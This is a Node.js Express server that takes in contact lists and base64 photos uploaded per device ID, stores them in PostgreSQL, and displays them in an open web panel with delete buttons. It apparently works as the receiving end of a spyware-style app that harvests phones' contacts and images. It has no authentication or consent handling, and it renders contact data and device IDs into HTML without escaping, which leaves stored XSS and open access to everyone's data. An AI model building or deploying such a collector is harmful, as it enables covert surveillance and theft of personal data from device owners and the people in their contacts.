const express = require("express");
const bodyParser = require("body-parser");
const { Pool } = require("pg");

const app = express();
app.use(bodyParser.json({ limit: "100mb" }));

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// ================= DB SETUP =================
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      device_id TEXT UNIQUE,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS contacts (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      contact_data TEXT,
      UNIQUE(device_id, contact_data)
    );

    CREATE TABLE IF NOT EXISTS images (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      image_data TEXT,
      UNIQUE(device_id, image_data)
    );
  `);
}
initDB();

// ================= RECEIVE DATA =================
app.post("/receive", async (req, res) => {
  try {
    const { type, device_id, data } = req.body;

    // Save user (no duplicate)
    await pool.query(
      "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
      [device_id]
    );

    if (!Array.isArray(data) || data.length === 0) {
      return res.send("No data");
    }

    // ===== CONTACTS =====
    if (type === "contacts") {
      const values = [];
      const placeholders = data.map((_, i) => {
        values.push(data[i]);
        return `($1, $${i + 2})`;
      });

      await pool.query(
        `INSERT INTO contacts (device_id, contact_data)
         VALUES ${placeholders.join(",")}
         ON CONFLICT (device_id, contact_data) DO NOTHING`,
        [device_id, ...values]
      );
    }

    // ===== IMAGES =====
    if (type === "images") {
      const values = [];
      const placeholders = data.map((_, i) => {
        values.push(data[i]);
        return `($1, $${i + 2})`;
      });

      await pool.query(
        `INSERT INTO images (device_id, image_data)
         VALUES ${placeholders.join(",")}
         ON CONFLICT (device_id, image_data) DO NOTHING`,
        [device_id, ...values]
      );
    }

    res.send("Saved without duplicates ✅");

  } catch (err) {
    console.error(err);
    res.status(500).send("Error");
  }
});

// ================= DELETE ROUTES =================

// Delete ALL data of user
app.delete("/delete-all/:device_id", async (req, res) => {
  const device_id = req.params.device_id;

  await pool.query("DELETE FROM contacts WHERE device_id=$1", [device_id]);
  await pool.query("DELETE FROM images WHERE device_id=$1", [device_id]);

  res.send("All data deleted ✅");
});

// Delete single contact
app.delete("/delete-contact/:id", async (req, res) => {
  await pool.query("DELETE FROM contacts WHERE id=$1", [req.params.id]);
  res.send("Contact deleted ✅");
});

// Delete single image
app.delete("/delete-image/:id", async (req, res) => {
  await pool.query("DELETE FROM images WHERE id=$1", [req.params.id]);
  res.send("Image deleted ✅");
});

// ================= USERS LIST =================
app.get("/users", async (req, res) => {
  const result = await pool.query("SELECT * FROM users ORDER BY id DESC");

  let html = `
  <html>
  <head>
    <title>Users</title>
    <style>
      body { background:#0f172a; color:white; font-family:sans-serif; padding:20px;}
      a { color:#22c55e; text-decoration:none; font-size:18px;}
      .card { background:#1e293b; padding:15px; margin:10px 0; border-radius:10px;}
    </style>
  </head>
  <body>
  <h1>Users</h1>
  `;

  result.rows.forEach(user => {
    html += `
      <div class="card">
        <a href="/user/${user.device_id}">
          ${user.device_id}
        </a>
      </div>
    `;
  });

  html += "</body></html>";

  res.send(html);
});

// ================= USER DATA (MODERN UI) =================
app.get("/user/:device_id", async (req, res) => {
  const device_id = req.params.device_id;

  const contacts = await pool.query(
    "SELECT * FROM contacts WHERE device_id=$1",
    [device_id]
  );

  const images = await pool.query(
    "SELECT * FROM images WHERE device_id=$1",
    [device_id]
  );

  let html = `
  <html>
  <head>
    <title>User Data</title>
    <style>
      body {
        background:#0f172a;
        color:white;
        font-family:sans-serif;
        padding:20px;
      }
      h1 { color:#22c55e; }
      .card {
        background:#1e293b;
        padding:15px;
        margin:10px 0;
        border-radius:10px;
      }
      button {
        background:red;
        color:white;
        border:none;
        padding:5px 10px;
        border-radius:5px;
        cursor:pointer;
        margin-top:5px;
      }
      img {
        border-radius:10px;
        margin:10px 0;
      }
    </style>
  </head>
  <body>

  <h1>Device: ${device_id}</h1>

  <button onclick="deleteAll()">Delete All Data</button>

  <h2>Contacts</h2>
  `;

  contacts.rows.forEach(c => {
    html += `
      <div class="card">
        ${c.contact_data}
        <br>
        <button onclick="deleteContact(${c.id})">Delete</button>
      </div>
    `;
  });

  html += "<h2>Images</h2>";

  images.rows.forEach(img => {
    html += `
      <div class="card">
        <img src="data:image/jpeg;base64,${img.image_data}" width="200"/>
        <br>
        <button onclick="deleteImage(${img.id})">Delete</button>
      </div>
    `;
  });

  html += `
  <script>
    function deleteContact(id){
      fetch('/delete-contact/' + id, {method:'DELETE'})
      .then(()=>location.reload());
    }

    function deleteImage(id){
      fetch('/delete-image/' + id, {method:'DELETE'})
      .then(()=>location.reload());
    }

    function deleteAll(){
      if(confirm("Delete all data?")){
        fetch('/delete-all/${device_id}', {method:'DELETE'})
        .then(()=>location.reload());
      }
    }
  </script>

  </body>
  </html>
  `;

  res.send(html);
});

// ================= HOME =================
app.get("/", (req, res) => {
  res.send(`
    <html>
    <body style="background:#0f172a;color:white;text-align:center;padding:50px;">
      <h1>Backend Running ✅</h1>
      <a href="/users" style="color:#22c55e;font-size:20px;">View Users</a>
    </body>
    </html>
  `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running 🚀"));
